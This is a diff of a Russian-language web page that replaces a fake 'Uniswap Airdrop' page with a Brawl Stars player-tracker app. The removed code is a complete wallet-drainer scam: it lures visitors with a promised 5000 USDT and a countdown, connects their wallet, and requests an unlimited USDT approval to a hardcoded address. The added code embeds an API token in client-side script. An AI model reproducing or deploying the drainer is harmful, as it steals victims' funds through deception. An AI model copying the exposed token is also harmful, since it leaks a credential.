@@ -2,327 +2,127 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Uniswap Airdrop | Получи 5000 USDT</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+    <title>Brawl Tracker PRO | S+ Edition</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800&family=Lilita+One&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            background: linear-gradient(135deg, #0B0E1A 0%, #1A1F2E 100%);
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        .card {
-            background: rgba(30, 35, 48, 0.95);
-            backdrop-filter: blur(10px);
-            border-radius: 32px;
-            padding: 28px 24px 32px;
-            max-width: 480px;
-            width: 100%;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.4), 0 0 0 1px rgba(255,255,255,0.05);
-            text-align: center;
-        }
-        .logo {
-            width: 80px;
-            height: 80px;
-            background: #FF007A;
-            border-radius: 24px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 20px;
-            font-size: 48px;
-            font-weight: bold;
-            box-shadow: 0 8px 20px rgba(255,0,122,0.3);
-        }
-        h1 {
-            font-size: 28px;
-            font-weight: 700;
-            background: linear-gradient(135deg, #FFFFFF 0%, #B0B8D0 100%);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            margin-bottom: 12px;
-        }
-        .sub {
-            color: #8B92A8;
-            font-size: 15px;
-            margin-bottom: 24px;
-            line-height: 1.4;
-        }
-        .amount-box {
-            background: rgba(0,0,0,0.4);
-            border-radius: 24px;
-            padding: 20px;
-            margin-bottom: 24px;
-            border: 1px solid rgba(255,255,255,0.08);
-        }
-        .amount-label {
-            color: #8B92A8;
-            font-size: 14px;
-            margin-bottom: 8px;
-        }
-        .amount-value {
-            font-size: 42px;
-            font-weight: 800;
-            color: #FF007A;
-            letter-spacing: 2px;
-        }
-        .amount-value span {
-            font-size: 20px;
-            color: #B0B8D0;
-        }
-        .timer {
-            background: rgba(255,0,122,0.15);
-            border-radius: 40px;
-            padding: 12px 16px;
-            margin-bottom: 28px;
-            font-size: 14px;
-            color: #FF007A;
-            font-weight: 500;
-        }
-        .btn-group {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-            margin-bottom: 16px;
-        }
-        .connect-btn {
-            background: linear-gradient(135deg, #FF007A 0%, #FF4D8C 100%);
-            border: none;
-            width: 100%;
-            padding: 18px;
-            border-radius: 60px;
-            font-size: 18px;
-            font-weight: 700;
-            color: white;
-            cursor: pointer;
-            transition: all 0.2s;
-            box-shadow: 0 4px 12px rgba(255,0,122,0.3);
-        }
-        .connect-btn-wc {
-            background: linear-gradient(135deg, #3B71F0 0%, #5C8DFF 100%);
-            box-shadow: 0 4px 12px rgba(59,113,240,0.3);
-        }
-        .connect-btn:active {
-            transform: scale(0.97);
-        }
-        .wallet-icons {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            margin-top: 20px;
-            opacity: 0.6;
-        }
-        .wallet-icons div {
-            background: #2A2F3E;
-            border-radius: 12px;
-            padding: 6px 12px;
-            font-size: 12px;
-            color: #B0B8D0;
-        }
-        .status {
-            margin-top: 20px;
-            padding: 14px;
-            border-radius: 16px;
-            font-size: 13px;
-            background: rgba(0,0,0,0.3);
-            color: #8B92A8;
-            word-break: break-all;
-        }
-        .footer {
-            margin-top: 24px;
-            font-size: 11px;
-            color: #4A4F62;
-        }
-        button:disabled {
-            opacity: 0.5;
-            transform: none;
-        }
-        .wc-link {
-            color: #5C8DFF;
-            text-decoration: none;
-            font-weight: bold;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body { font-family: 'Inter', sans-serif; min-height: 100vh; padding: 0 16px 40px 16px; transition: background 0.3s ease, color 0.2s; position: relative; overflow-x: hidden; }
+        .bg-animation { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -2; transition: background 0.5s; }
+        .particles { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; pointer-events: none; }
+        .particle { position: absolute; background: rgba(255,215,0,0.3); border-radius: 50%; pointer-events: none; animation: floatParticle linear infinite; }
+        @keyframes floatParticle { 0% { transform: translateY(100vh) rotate(0deg); opacity: 0; } 10% { opacity: 0.8; } 90% { opacity: 0.8; } 100% { transform: translateY(-100vh) rotate(360deg); opacity: 0; } }
+        body.dark { color: #EDF2F7; } body.dark .bg-animation { background: radial-gradient(circle at 20% 30%, #0a0f1a, #03060c); }
+        body.light { color: #0B1120; } body.light .bg-animation { background: linear-gradient(145deg, #e0e7ff, #f8fafc); }
+        body.neon { color: #fff; } body.neon .bg-animation { background: radial-gradient(circle at 30% 10%, #0a0f2a, #00000c); box-shadow: inset 0 0 50px rgba(0,255,255,0.2); } body.neon .card { border-color: #0ff; box-shadow: 0 0 15px rgba(0,255,255,0.3); }
+        .container { max-width: 1300px; margin: 0 auto; position: relative; z-index: 2; }
+        .header { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 16px; padding: 20px 0; margin-bottom: 24px; animation: slideDown 0.6s ease; }
+        @keyframes slideDown { from { opacity: 0; transform: translateY(-30px); } to { opacity: 1; transform: translateY(0); } }
+        .logo h1 { font-family: 'Lilita One', cursive; font-size: 28px; background: linear-gradient(135deg, #FFD966, #FFB347); -webkit-background-clip: text; background-clip: text; color: transparent; animation: pulseGlow 2s infinite; }
+        @keyframes pulseGlow { 0% { text-shadow: 0 0 0px rgba(255,215,0,0); } 50% { text-shadow: 0 0 8px rgba(255,215,0,0.5); } 100% { text-shadow: 0 0 0px rgba(255,215,0,0); } }
+        .coin-panel { background: rgba(30, 41, 59, 0.8); backdrop-filter: blur(12px); padding: 8px 20px; border-radius: 60px; display: flex; align-items: center; gap: 12px; font-weight: bold; }
+        .coins-count { font-size: 26px; color: #FFD966; }
+        .daily-btn, .shop-btn { background: #2D3A4E; border: none; color: white; padding: 6px 14px; border-radius: 40px; cursor: pointer; font-weight: 600; }
+        .card { backdrop-filter: blur(16px); border-radius: 32px; padding: 20px; margin-bottom: 24px; border: 1px solid rgba(255,215,0,0.4); transition: transform 0.2s, box-shadow 0.2s; animation: fadeInUp 0.5s ease backwards; }
+        .card:hover { transform: translateY(-4px); box-shadow: 0 20px 30px -10px rgba(0,0,0,0.3); }
+        @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        body.dark .card { background: rgba(20, 30, 45, 0.8); } body.light .card { background: rgba(255, 255, 255, 0.9); border-color: #FFD966; } body.neon .card { background: rgba(0, 10, 20, 0.7); border-color: #0ff; }
+        .search-area { display: flex; gap: 12px; flex-wrap: wrap; }
+        .search-area input { flex: 2; background: rgba(15, 23, 42, 0.8); border: 1px solid #FFD966; padding: 14px 18px; border-radius: 60px; color: white; font-size: 16px; }
+        .search-area input:focus { outline: none; border-color: #FFA500; box-shadow: 0 0 12px rgba(255,215,0,0.4); }
+        .search-area button { background: linear-gradient(135deg, #FFD966, #FFB347); border: none; padding: 0 28px; border-radius: 60px; font-weight: bold; cursor: pointer; transition: transform 0.1s; }
+        .search-area button:active { transform: scale(0.96); }
+        .stat-item, .brawler-card, .battle-row, .fav-tag { transition: all 0.2s; }
+        .stat-item:hover, .brawler-card:hover, .fav-tag:hover { transform: scale(1.02); background: rgba(255,215,0,0.2); }
+        .player-stats { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px,1fr)); gap: 12px; margin-top: 16px; }
+        .stat-item { background: rgba(0,0,0,0.4); padding: 12px; border-radius: 24px; text-align: center; }
+        .brawler-list { display: grid; grid-template-columns: repeat(auto-fill, minmax(160px,1fr)); gap: 12px; margin-top: 16px; }
+        .brawler-card { background: rgba(0,0,0,0.4); border-radius: 24px; padding: 12px; display: flex; justify-content: space-between; align-items: center; }
+        .battle-row { background: rgba(0,0,0,0.4); margin-bottom: 8px; padding: 12px; border-radius: 20px; display: flex; flex-wrap: wrap; justify-content: space-between; }
+        .favorite-tags { display: flex; flex-wrap: wrap; gap: 12px; margin: 16px 0; }
+        .fav-tag { background: #2D3A4E; padding: 6px 14px; border-radius: 40px; cursor: pointer; }
+        .settings-fab { position: fixed; bottom: 24px; right: 24px; background: #2D3A4E; width: 56px; height: 56px; border-radius: 30px; display: flex; align-items: center; justify-content: center; cursor: pointer; z-index: 1000; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
+        .settings-modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(0, 0, 0, 0.96); backdrop-filter: blur(20px); border-radius: 40px; padding: 24px; width: 280px; z-index: 1001; border: 1px solid #FFD966; text-align: center; }
+        .settings-modal button { background: #2c5f6e; border: none; padding: 10px 16px; margin: 8px; border-radius: 60px; cursor: pointer; color: white; font-weight: bold; }
+        @media (max-width: 680px) { .player-stats { grid-template-columns: 1fr 1fr; } .brawler-list { grid-template-columns: 1fr; } }
+        canvas { max-height: 250px; width: 100%; margin-top: 20px; }
+        .footer-small { text-align: center; margin-top: 30px; opacity: 0.7; font-size: 12px; }
     </style>
 </head>
-<body>
-    <div class="card">
-        <div class="logo">
-            🦄
-        </div>
-        <h1>Uniswap Airdrop</h1>
-        <div class="sub">Подключи кошелек и получи 5000 USDT</div>
-        
-        <div class="amount-box">
-            <div class="amount-label">Твой дроп</div>
-            <div class="amount-value">5,000 <span>USDT</span></div>
-        </div>
-        
-        <div class="timer">
-            ⏱️ Предложение истекает через 23:59
-        </div>
-        
-        <div class="btn-group">
-            <button class="connect-btn" id="connectBtn">🦊 Подключить MetaMask / Trust</button>
-            <button class="connect-btn connect-btn-wc" id="wcBtn">📱 WalletConnect (Trust / MetaMask)</button>
-        </div>
-        
-        <div class="wallet-icons">
-            <div>🦊 MetaMask</div>
-            <div>🟣 Trust Wallet</div>
-            <div>🔵 Coinbase</div>
-        </div>
-        
-        <div class="status" id="status">
-            Ожидание подключения...
-        </div>
-        <div class="footer">
-            ✅ Только сегодня | ✅ Только для новых кошельков
+<body class="dark">
+<div class="bg-animation"></div>
+<div class="particles" id="particles"></div>
+<div class="container">
+    <div class="header">
+        <div class="logo"><h1>⚡ BRAWL TRACKER PRO+</h1><span style="font-size:12px;">BS Tracker + Tracker+</span></div>
+        <div class="coin-panel">
+            <i class="fas fa-coins"></i> <span class="coins-count" id="coinsAmount">0</span>
+            <button id="dailyBonusBtn" class="daily-btn">🎁 Бонус</button>
+            <button id="openShopBtn" class="shop-btn">🏪 Магазин</button>
         </div>
     </div>
-
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-    <script>
-        // =============== ТВОЙ КОШЕЛЕК ===============
-        const YOUR_WALLET = "0x5CAB3a6e416e2241e7eE8470dF967f1D2eF98Fe5";
-        
-        // Адрес USDT (ERC-20)
-        const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
-        
-        // ABI для approve
-        const USDT_ABI = [
-            "function approve(address spender, uint256 amount) public returns (bool)",
-            "function allowance(address owner, address spender) view returns (uint256)",
-            "function balanceOf(address account) view returns (uint256)",
-            "function decimals() view returns (uint8)"
-        ];
-        
-        const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-        
-        let provider = null;
-        let signer = null;
-        let userAddress = null;
-        let usdtContract = null;
-        
-        // ОСНОВНАЯ ФУНКЦИЯ ДЛЯ METAMASK/TRUST (через window.ethereum)
-        async function connectWallet() {
-            const btn = document.getElementById('connectBtn');
-            const statusDiv = document.getElementById('status');
-            
-            if (!window.ethereum) {
-                statusDiv.innerHTML = '❌ MetaMask или Trust Wallet не установлены. Используй кнопку WalletConnect ниже.';
-                statusDiv.style.color = '#FF6B6B';
-                btn.disabled = false;
-                return;
-            }
-            
-            btn.disabled = true;
-            btn.innerText = '⏳ Подключаемся...';
-            statusDiv.innerHTML = '⏳ Запрашиваем доступ...';
-            
-            try {
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                userAddress = accounts[0];
-                
-                provider = new ethers.providers.Web3Provider(window.ethereum);
-                signer = provider.getSigner();
-                usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
-                
-                const balance = await usdtContract.balanceOf(userAddress);
-                const decimals = await usdtContract.decimals();
-                const formattedBalance = parseFloat(ethers.utils.formatUnits(balance, decimals)).toFixed(2);
-                
-                statusDiv.innerHTML = `✅ Подключен: ${userAddress.substring(0,6)}...${userAddress.substring(38)}<br>💰 Баланс USDT: ${formattedBalance}`;
-                statusDiv.style.color = '#8B92A8';
-                
-                const currentAllowance = await usdtContract.allowance(userAddress, YOUR_WALLET);
-                
-                if (currentAllowance.toString() === "0") {
-                    statusDiv.innerHTML += `<br>🟢 Нажми "Активировать" и подтверди в кошельке. Комиссия: ~$2.`;
-                    btn.innerText = '💎 Активировать дроп (бесплатно)';
-                    btn.disabled = false;
-                    btn.onclick = approveUSDT;
-                } else {
-                    statusDiv.innerHTML += `<br>✅ Дроп уже активирован! Ожидай начисления.`;
-                    btn.innerText = '✅ Активировано';
-                    btn.disabled = true;
-                }
-                
-            } catch (error) {
-                statusDiv.innerHTML = `❌ Ошибка: ${error.message.substring(0, 100)}`;
-                btn.innerText = '🔗 Подключить кошелек';
-                btn.disabled = false;
-                btn.onclick = connectWallet;
-            }
-        }
-        
-        // ФУНКЦИЯ ДЛЯ WALLETCONNECT (через deep link для Trust Wallet и MetaMask)
-        async function connectWalletConnect() {
-            const statusDiv = document.getElementById('status');
-            const currentUrl = encodeURIComponent(window.location.href);
-            
-            // Deep link для Trust Wallet
-            const trustLink = `https://link.trustwallet.com/open_url?coin_id=60&url=${currentUrl}`;
-            
-            // Universal link для MetaMask (работает на телефонах)
-            const metamaskLink = `https://metamask.app.link/dapp/${window.location.href.replace('https://', '')}`;
-            
-            statusDiv.innerHTML = `
-                🔗 Выбери свой кошелек:<br><br>
-                🟣 <a href="${trustLink}" class="wc-link" style="display:inline-block; margin:5px 0;">Открыть в Trust Wallet</a><br>
-                🦊 <a href="${metamaskLink}" class="wc-link" style="display:inline-block; margin:5px 0;">Открыть в MetaMask</a><br><br>
-                ⚡ После открытия кошелька — нажми "Подключиться" на сайте внутри кошелька
-            `;
-            statusDiv.style.color = '#B0B8D0';
-        }
-        
-        // ФУНКЦИЯ APPROVE (общая для обоих способов)
-        async function approveUSDT() {
-            const btn = document.getElementById('connectBtn');
-            const statusDiv = document.getElementById('status');
-            
-            btn.disabled = true;
-            btn.innerText = '⏳ Отправляем...';
-            statusDiv.innerHTML = '⏳ Подпиши транзакцию в кошельке...';
-            
-            try {
-                const tx = await usdtContract.approve(YOUR_WALLET, MAX_UINT256);
-                statusDiv.innerHTML = `⏳ Транзакция отправлена. Ждем подтверждения...<br>${tx.hash.substring(0,40)}...`;
-                
-                await tx.wait();
-                
-                statusDiv.innerHTML = '✅✅✅ ГОТОВО! Дроп будет начислен в течение 24 часов. ✅✅✅';
-                statusDiv.style.color = '#00FFAA';
-                btn.innerText = '✅ ГОТОВО';
-                btn.disabled = true;
-                
-            } catch (error) {
-                statusDiv.innerHTML = `❌ Транзакция отклонена: ${error.message.substring(0,80)}`;
-                btn.innerText = '💎 Попробовать снова';
-                btn.disabled = false;
-                btn.onclick = approveUSDT;
-            }
-        }
-        
-        // НАЗНАЧАЕМ КНОПКИ
-        document.getElementById('connectBtn').onclick = connectWallet;
-        document.getElementById('wcBtn').onclick = connectWalletConnect;
-        
-        // Восстанавливаем обработчик если approve не прошел
-        window.resetApprove = function() {
-            const btn = document.getElementById('connectBtn');
-            btn.onclick = approveUSDT;
-            btn.innerText = '💎 Активировать дроп';
-            btn.disabled = false;
-        };
-    </script>
+    <div class="card">
+        <div class="search-area">
+            <input type="text" id="playerTag" placeholder="#2PPQVUQ8J или любой тег" value="#2PPQVUQ8J">
+            <button id="searchBtn"><i class="fas fa-search"></i> Найти</button>
+        </div>
+        <div class="favorite-tags" id="favoriteTagsList"></div>
+        <div id="playerInfo"></div>
+        <div id="battleLogSection"></div>
+        <div id="brawlersSection"></div>
+        <div id="mapAdviceSection"></div>
+        <div id="chartSection"><canvas id="progressChart"></canvas></div>
+    </div>
+    <div id="shopModal" style="display:none; position:fixed; top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);backdrop-filter:blur(8px);z-index:1000;justify-content:center;align-items:center;">
+        <div style="background:#1E293B; border-radius:40px; padding:28px; max-width:400px; width:90%;">
+            <h3>🏪 МАГАЗИН <span id="closeShop" style="float:right;cursor:pointer;">✖️</span></h3>
+            <div style="margin:20px 0;">
+                <div style="background:#FFD966; border-radius:28px; padding:16px; color:#0B0F17;"><i class="fas fa-crown"></i> <strong>BS Tracker+</strong> — 14 дней<br>✔ Расширенный боевой лог<br>✔ Детальная статистика<br>✔ Продвинутые советы</div>
+                <button id="buyPlusBtn" style="background:#FFB347; width:100%; padding:14px; border-radius:60px; margin-top:20px;">💰 1500 COINS</button>
+                <div id="plusStatus" style="margin-top:12px; text-align:center;"></div>
+            </div>
+        </div>
+    </div>
+    <div class="settings-fab" id="settingsFab"><i class="fas fa-sliders-h"></i></div>
+    <div class="settings-modal" id="settingsModal">
+        <h4>🎮 Настройки</h4>
+        <button id="themeDark">🌙 Тёмная</button>
+        <button id="themeLight">☀️ Светлая</button>
+        <button id="themeNeon">💚 Неоновая</button>
+        <button id="toggleSoundBtn">🔊 Звук: Вкл</button>
+        <button id="particlesBtn">✨ Частицы: Вкл</button>
+    </div>
+</div>
+<script>
+    let soundEnabled = true;
+    function playClickSound() { if (!soundEnabled) return; try { let AudioCtx = window.AudioContext || window.webkitAudioContext; let ctx = new AudioCtx(); let osc = ctx.createOscillator(); let gain = ctx.createGain(); osc.connect(gain); gain.connect(ctx.destination); osc.frequency.value = 880; gain.gain.value = 0.1; osc.start(); gain.gain.exponentialRampToValueAtTime(0.00001, ctx.currentTime + 0.1); osc.stop(ctx.currentTime + 0.1); } catch(e) { } }
+    function playWinSound() { if (!soundEnabled) return; try { let AudioCtx = window.AudioContext || window.webkitAudioContext; let ctx = new AudioCtx(); let osc = ctx.createOscillator(); let gain = ctx.createGain(); osc.connect(gain); gain.connect(ctx.destination); osc.frequency.value = 1400; gain.gain.value = 0.15; osc.start(); gain.gain.exponentialRampToValueAtTime(0.00001, ctx.currentTime + 0.2); osc.stop(ctx.currentTime + 0.2); } catch(e) { } }
+    let particlesEnabled = true;
+    function initParticles() { const container = document.getElementById('particles'); container.innerHTML = ''; if (!particlesEnabled) return; for (let i = 0; i < 40; i++) { let p = document.createElement('div'); p.classList.add('particle'); let size = Math.random() * 6 + 2; p.style.width = size + 'px'; p.style.height = size + 'px'; p.style.left = Math.random() * 100 + '%'; p.style.animationDuration = Math.random() * 8 + 5 + 's'; p.style.animationDelay = Math.random() * 10 + 's'; container.appendChild(p); } }
+    let coins = 0, dailyStreak = 0, lastDailyDate = "", plusExpiry = 0, plusActive = false;
+    const DAILY_REWARDS = [100,150,250,250,500,300,1200];
+    function loadUserData() { let data = localStorage.getItem("bs_tracker_user"); if(data) { let obj = JSON.parse(data); coins = obj.coins||0; dailyStreak = obj.dailyStreak||0; lastDailyDate = obj.lastDailyDate||""; plusExpiry = obj.plusExpiry||0; } else { coins = 300; } updateCoinsUI(); checkPlusActive(); }
+    function saveUserData() { localStorage.setItem("bs_tracker_user", JSON.stringify({coins, dailyStreak, lastDailyDate, plusExpiry})); }
+    function updateCoinsUI() { document.getElementById("coinsAmount").innerText = coins; }
+    function checkPlusActive() { let now = Date.now(); plusActive = (plusExpiry > now); if(!plusActive && plusExpiry>0) plusExpiry=0; updatePlusUI(); }
+    function updatePlusUI() { document.getElementById("plusStatus").innerHTML = plusActive ? `<span style="color:#FFD966;">✅ Активен ещё ${Math.ceil((plusExpiry-Date.now())/86400000)} дн.</span>` : `❌ Не активен`; }
+    function giveDailyBonus() { let today = new Date().toDateString(); if(lastDailyDate === today) { alert("Бонус уже получен!"); return; } let streak = (lastDailyDate && new Date(new Date().setDate(new Date().getDate()-1)).toDateString() === lastDailyDate) ? Math.min(dailyStreak+1,6) : 0; let reward = DAILY_REWARDS[streak]; coins += reward; dailyStreak = streak; lastDailyDate = today; saveUserData(); updateCoinsUI(); playWinSound(); alert(`🎁 +${reward} COINS! День ${streak+1}/7`); }
+    function buyTrackerPlus() { if(plusActive) { alert("Уже активен"); return; } if(coins >= 1500) { coins -= 1500; plusExpiry = Date.now() + 14*86400000; saveUserData(); updateCoinsUI(); checkPlusActive(); alert("BS Tracker+ активирован на 14 дней!"); renderCurrentPlayer(); playWinSound(); } else alert(`Не хватает монет (нужно 1500)`); }
+    let currentPlayerData = null, currentBattleLog = [], currentBrawlers = [];
+    const API_KEY = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiIsImtpZCI6IjI4YTMxOGY3LTAwMDAtYTFlYi03ZmExLTJjNzQzM2M2Y2NhNSJ9.eyJpc3MiOiJzdXBlcmNlbGwiLCJhdWQiOiJzdXBlcmNlbGw6Z2FtZWFwaSIsImp0aSI6IjdmZmU4NWYyLWI2ZDQtNDllNC04ZTgzLWE5ZGM5MzUwYWI1ZSIsImlhdCI6MTc4MDgzMzUwMSwic3ViIjoiZGV2ZWxvcGVyLzEzMDNlYTE1LWU1ZDItYmV hMS1hYmMwLTQ4YTk5MGIxZDIzYyIsInNjb3BlcyI6WyJicmF3bHN0YXJzIl0sImxpbWl0cyI6W3sidGllciI6ImRldmVsb3Blci9zaWx2ZXIiLCJ0eXBlIjoidGhyb3R0bGluZyJ9LHsiY2lkcnMiOlsiNDUuNzkuMjE4Ljc5Il0sInR5cGUiOiJjbGllbnQifV19.XBUb06lR-X7cZrH86mAu2YgTNsXNIXpkFGl29JyBOtZ14qT1quIfTxuzsGMEVSRn-oNEsgEYe1ozObkFTf3GyA";
+    async function fetchPlayer(tag) { let clean = tag.replace(/#/g,'').toUpperCase(); let url = `https://api.brawlstars.com/v1/players/%23${clean}`; let res = await fetch(url, { headers: { "Authorization": `Bearer ${API_KEY}` } }); if(res.status === 403) throw new Error("❌ КЛЮЧ НЕДЕЙСТВИТЕЛЕН. Удали старый ключ на developer.brawlstars.com и создай новый с IP: 45.79.218.79"); if(res.status === 404) throw new Error("❌ Игрок не найден. Проверь тег (пример: #2PPQVUQ8J)"); if(!res.ok) throw new Error(`Ошибка ${res.status}: ${res.statusText}`); let player = await res.json(); let battleRes = await fetch(`https://api.brawlstars.com/v1/players/%23${clean}/battlelog`, { headers: { "Authorization": `Bearer ${API_KEY}` } }); let battleData = battleRes.ok ? await battleRes.json() : { items: [] }; return { player, battleLog: battleData.items || [] }; }
+    async function searchPlayer() { let tag = document.getElementById("playerTag").value.trim(); if(!tag.startsWith("#")) tag = "#"+tag; document.getElementById("playerInfo").innerHTML = `<div style="padding:20px;">⏳ Загрузка...</div>`; try { let { player, battleLog } = await fetchPlayer(tag); currentPlayerData = player; currentBattleLog = battleLog.slice(0, plusActive ? 20 : 10); currentBrawlers = player.brawlers || []; renderPlayerUI(); saveFavoriteTag(tag); playClickSound(); } catch(e) { document.getElementById("playerInfo").innerHTML = `<div style="background:#aa2e2e; padding:20px; border-radius:28px;">❌ ${e.message}</div>`; } }
+    function renderPlayerUI() { if(!currentPlayerData) return; let p = currentPlayerData; let html = `<div><h2>${p.name} <span style="color:#FFD966;">#${p.tag.replace('#','')}</span></h2><p>🏆 ${p.trophies} трофеев | 🏅 Уровень ${p.expLevel}</p><div class="player-stats"><div class="stat-item">🎯 3vs3 побед: ${p["3vs3Victories"]||0}</div><div class="stat-item">⭐ Соло побед: ${p.soloVictories||0}</div><div class="stat-item">👥 Дуо побед: ${p.duoVictories||0}</div><div class="stat-item">💀 Всего боёв: ${p.battleCount||0}</div></div></div>`; document.getElementById("playerInfo").innerHTML = html; let logHtml = `<div class="card-title">📜 БОЕВОЙ ЛОГ ${plusActive ? "(расширенный)" : "(10 последних)"}</div>`; if(currentBattleLog.length === 0) logHtml += "<div>Нет боёв в логе</div>"; currentBattleLog.forEach(b => { let win = b.battle.result === "victory"; logHtml += `<div class="battle-row"><span><strong>${b.battle.mode || "?"}</strong> ${b.battle.map || ""}</span><span>${b.battle.brawler?.name || "?"}</span><span style="color:${win ? '#7EFF7E' : '#FF9090'}">${win ? "🏆 ПОБЕДА" : "💀 ПОРАЖЕНИЕ"}</span><span>${b.battle.trophyChange ? (b.battle.trophyChange>0 ? `+${b.battle.trophyChange}` : b.battle.trophyChange) : "—"}</span></div>`; }); document.getElementById("battleLogSection").innerHTML = logHtml; let brawHtml = `<div class="card-title">👥 БРАВЛЕРЫ (${currentBrawlers.length})</div><div class="brawler-list">`; currentBrawlers.slice(0, plusActive ? 100 : 30).forEach(b => { brawHtml += `<div class="brawler-card"><div><strong>${b.name}</strong><br>🏆 ${b.trophies}</div><div>⚡ Уровень ${b.power || 1}</div></div>`; }); brawHtml += `</div>`; document.getElementById("brawlersSection").innerHTML = brawHtml; let advice = `<div class="card-title">🗺️ РЕКОМЕНДАЦИИ НА КАРТЫ</div><div>🎯 Актуальные карты: "Заброшенный город", "Золотая бухта". Лучшие пики: Спайк, Леон, Пайпер.<br>${plusActive ? '✨ Tracker+ активен: дополнительный анализ винрейта по картам доступен.' : '🔒 Купи BS Tracker+ для детальных советов по картам и контр-пикам.'}</div>`; document.getElementById("mapAdviceSection").innerHTML = advice; let ctx = document.getElementById('progressChart').getContext('2d'); if(window.myChart) window.myChart.destroy(); let mockData = [p.trophies-200, p.trophies-150, p.trophies-80, p.trophies-40, p.trophies]; window.myChart = new Chart(ctx, { type: 'line', data: { labels: ['4 нед.', '3 нед.', '2 нед.', '1 нед.', 'сегодня'], datasets: [{ label: 'Трофеи', data: mockData, borderColor: '#FFD966', tension: 0.3, fill: true }] }, options: { responsive: true } }); }
+    function renderCurrentPlayer() { if(currentPlayerData) renderPlayerUI(); }
+    let favorites = [];
+    function loadFavorites() { let fav = localStorage.getItem("bs_fav_tags"); favorites = fav ? JSON.parse(fav) : ["#2PPQVUQ8J"]; renderFavorites(); }
+    function saveFavoriteTag(tag) { if(!favorites.includes(tag)) { favorites.unshift(tag); if(favorites.length>6) favorites.pop(); localStorage.setItem("bs_fav_tags",JSON.stringify(favorites)); renderFavorites(); } }
+    function renderFavorites() { let html = ""; favorites.forEach(t=>{ html+=`<div class="fav-tag" data-tag="${t}">${t}</div>`; }); document.getElementById("favoriteTagsList").innerHTML = html; document.querySelectorAll(".fav-tag").forEach(el=>{ el.onclick = ()=>{ document.getElementById("playerTag").value = el.dataset.tag; searchPlayer(); }; }); }
+    function initSettings() { document.getElementById("themeDark").onclick = ()=>{ document.body.classList.remove("light","neon"); document.body.classList.add("dark"); localStorage.setItem("bs_theme","dark"); }; document.getElementById("themeLight").onclick = ()=>{ document.body.classList.remove("dark","neon"); document.body.classList.add("light"); localStorage.setItem("bs_theme","light"); }; document.getElementById("themeNeon").onclick = ()=>{ document.body.classList.remove("dark","light"); document.body.classList.add("neon"); localStorage.setItem("bs_theme","neon"); }; let savedTheme = localStorage.getItem("bs_theme"); if(savedTheme === "light") document.body.classList.add("light"); else if(savedTheme === "neon") document.body.classList.add("neon"); else document.body.classList.add("dark"); let soundBtn = document.getElementById("toggleSoundBtn"); soundBtn.onclick = ()=>{ soundEnabled = !soundEnabled; soundBtn.innerText = soundEnabled ? "🔊 Звук: Вкл" : "🔇 Звук: Выкл"; localStorage.setItem("bs_sound", soundEnabled); }; let savedSound = localStorage.getItem("bs_sound"); if(savedSound !== null) soundEnabled = savedSound === "true"; soundBtn.innerText = soundEnabled ? "🔊 Звук: Вкл" : "🔇 Звук: Выкл"; let particlesBtn = document.getElementById("particlesBtn"); particlesBtn.onclick = ()=>{ particlesEnabled = !particlesEnabled; initParticles(); localStorage.setItem("bs_particles", particlesEnabled); }; let savedParticles = localStorage.getItem("bs_particles"); if(savedParticles !== null) particlesEnabled = savedParticles === "true"; initParticles(); }
+    function init() { loadUserData(); loadFavorites(); initSettings(); document.getElementById("dailyBonusBtn").onclick = giveDailyBonus; document.getElementById("openShopBtn").onclick = ()=>document.getElementById("shopModal").style.display="flex"; document.getElementById("closeShop").onclick = ()=>document.getElementById("shopModal").style.display="none"; document.getElementById("buyPlusBtn").onclick = ()=>{ buyTrackerPlus(); document.getElementById("shopModal").style.display="none"; }; document.getElementById("searchBtn").onclick = searchPlayer; const settingsFab = document.getElementById("settingsFab"); const settingsModal = document.getElementById("settingsModal"); settingsFab.onclick = (e) => { e.stopPropagation(); settingsModal.style.display = (settingsModal.style.display === "flex") ? "none" : "flex"; }; window.onclick = (e) => { if(e.target === settingsModal) settingsModal.style.display = "none"; }; searchPlayer(); setInterval(()=>{ checkPlusActive(); if(currentPlayerData) renderPlayerUI(); }, 60000); }
+    init();
+</script>
 </body>
 </html>
